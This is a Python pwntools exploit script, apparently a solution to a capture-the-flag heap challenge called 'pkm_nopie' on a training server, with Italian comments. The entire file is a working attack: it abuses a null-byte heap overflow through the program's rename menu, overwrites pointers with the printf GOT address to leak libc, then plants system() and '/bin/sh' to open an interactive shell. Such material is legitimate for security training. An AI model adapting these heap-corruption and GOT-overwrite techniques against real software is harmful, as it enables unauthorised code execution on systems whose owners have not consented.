from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']
#context.log_level = 'debug'
binary=ELF("./pkm_nopie")
libc = ELF("./libc-2.27_notcache.so")

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 2025)

else:
    p=process("./pkm_nopie")
    gdb.attach(p,"""
    #b* 0x00401d33
    
    """)

#input("wait")

def add():
    p.recvuntil(b"> ")
    p.sendline(b"0")

def rename(pkm ,length, name):
    p.recvuntil(b"> ")
    p.sendline(b"1")    
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm)
    p.recvuntil(b"[.] insert length: ")
    p.sendline(b"%d" % length)
    p.sendline( name)

def delete(pkm):
    p.recvuntil(b"> ")
    p.sendline(b"2") 
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm) 


def fight(pkm , move, pkm1):
    p.recvuntil(b"> ")
    p.sendline(b"3") 
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm) 
    p.recvuntil(b"> ")
    p.sendline(b"%d" % move) 
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm1) 

def info(pkm):
    p.recvuntil(b"> ")
    p.sendline(b"4") 
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm)    

def exit():
    p.recvuntil(b"> ")
    p.sendline(b"5")

add()
add()
add()
rename(0,264,b"\x00"*256)
rename(1,776,(b"\x10\x02")*380+b"\x00\x00")
add()
delete(1)
rename(0,264,b"\x00"*264)  #sovrascrivo con null byte size di B

add()
add()
add()

delete(4) #elimina b1
delete(2)
delete(3)
rename(1,776,(b"\x55")*264+(b"\x30\x40\x40"+(b"\x00")*5)*4+b"\x30\x40\x40") #sovrascrivo con indirizzo got della printf
info(5)

p.recv(8)
leak = p.recv(6)

leaked_libc=leak.ljust(8,b"\x00")
leaked_libc = u64(leaked_libc)
#print("libc leak: %#x" % leaked_libc)
libc_base=leaked_libc-0x63830
#print("libc base : %#x" % libc_base)
#one_gadget=libc_base+0x4e475
#print("one gadget : %#x" % one_gadget)
libc.address=libc_base
bin_sh_=next(libc.search(b"/bin/sh")) 
#print("BIN : "+hex(bin_sh_))
system_=libc.symbols["system"]
#print("System : "+hex(system_))


rename(1,776,(b"\x11")*256+b"\x2f\x62\x69\x6e\x2f\x73\x68\x00"+(b"\x30\x40\x40"+(b"\x00")*5)*4+b"\x30\x40\x40"+(b"\x00")*5+b"\x05"+b"\x00"*7+b"\x00"*208+b"\xe8\x40\x40"+b"\x00"*5+b"\xe8\x40\x40"+b"\x00"*5+b"\xe8\x40\x40"+b"\x00"*5+p64(system_)+b"\x43"*160)
fight(5,12,1)


p.interactive()
